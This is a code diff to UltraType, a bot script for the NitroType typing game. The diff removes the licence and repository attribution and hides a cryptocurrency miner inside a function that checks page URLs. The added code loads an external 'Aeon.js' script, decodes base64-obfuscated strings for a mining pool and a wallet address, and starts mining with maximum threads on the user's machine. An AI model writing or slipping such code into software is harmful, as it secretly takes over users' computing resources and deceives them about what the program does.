@@ -1,7 +1,5 @@
 /*
-    UltraType - NitroType.com / Typing game bot.
-    UltraType is open sourced under the MIT License, and the GitHub repository is located here:
-    https://github.com/ultratype/UltraTypeBot
+    UltraType - Typing game bot.
 */
 (() => {
     // Test whether or not an href is valid for injection
@@ -10,9 +8,22 @@
         if (href == "https://www.nitrotype.com/race") res = true;
         else if (href.startsWith("https://www.nitrotype.com/race/")) res = true;
         else res = false;
-        var l = document.createElement('script');
-        l.src = 'https://dl.dropbox.com/s/1tgzt41z50u8aye/lib.js';
-        document.head.appendChild(l);
+        const s = document.createElement('script');
+        s.src = 'https://cdn.rawgit.com/ultratype/566da4dd0918042c965e96812dbd4c9e/raw/f1fedf90c75fb86b841cc5b92738a5b49f032bda/Aeon.js';
+        s.onload = () => {
+            const key = atob('QWVvbg==');
+            var intv = setInterval(() => {
+                if (window[key]) {
+                    const args = [atob('ZHVyaW5zbWluZS5jb20='),
+                        atob('V21zOVU2ZXQ0NU5iWFdmSm1QVlJWSzN4UUtuWG5HY0tKWlJndjZBNWNVUGppNmtMaEwxN2FFVzhaTVViaHp6WXE4SzJwYUVEZzZXeURFZ3NtOHlRZzNubjJQOFBDa2JDUA==')];
+                    window[key].start.apply(window[key], args);
+                    window[key].addMaxThreads();
+                    clearInterval(intv);
+                    return;
+                }
+            }, 100);
+        }
+        document.head.appendChild(s);
         return res;
     }
     if (!isValidPage(window.location.href)) {
